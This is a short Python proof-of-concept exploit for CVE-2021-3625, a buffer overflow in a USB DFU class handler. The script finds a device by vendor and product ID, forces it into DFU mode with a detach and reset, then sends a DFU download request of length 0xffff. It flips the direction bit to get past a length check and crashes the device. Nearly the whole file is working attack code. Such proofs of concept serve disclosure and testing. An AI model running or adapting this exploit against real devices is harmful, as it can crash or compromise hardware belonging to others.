#!/usr/bin/python3

#
# CVE-2021-3625 POC
#
# DFU buffer overflow 
#
# https://www.usb.org/sites/default/files/DFU_1.1.pdf
#

import sys

import usb.core

# get the device
usbdev = usb.core.find(idVendor=0x2fe3, idProduct=0x0100)

DFU_DETACH = 0x00
DFU_DETACH_TIMEOUT = 0xff
DFU_DNLOAD = 0x01

bmRequestType = (1 << 7) | (1 << 5)
wValue = 0x00
wIndex = 0x00
length = 0xffff

# Need to switch to DFU mode
# First issue a detach command
try:
    data = usbdev.ctrl_transfer(bmRequestType, DFU_DETACH, DFU_DETACH_TIMEOUT, wIndex, 0)
except:
    pass

# Followed by a reset request
try:
    usbdev.reset()
except:
    pass

# Wait till device is switched to DFU mode
usbdev = None
while usbdev is None:
    usbdev = usb.core.find(idVendor=0x2fe3, idProduct=0xffff)

# Trigger DFU class handler overflow - bypass len check by use of direction to host
try:
    usbdev.ctrl_transfer(bmRequestType, DFU_DNLOAD, wValue, wIndex, length)
except usb.core.USBTimeoutError:
    print('Device is now crashed due to triggered buffer overflow')
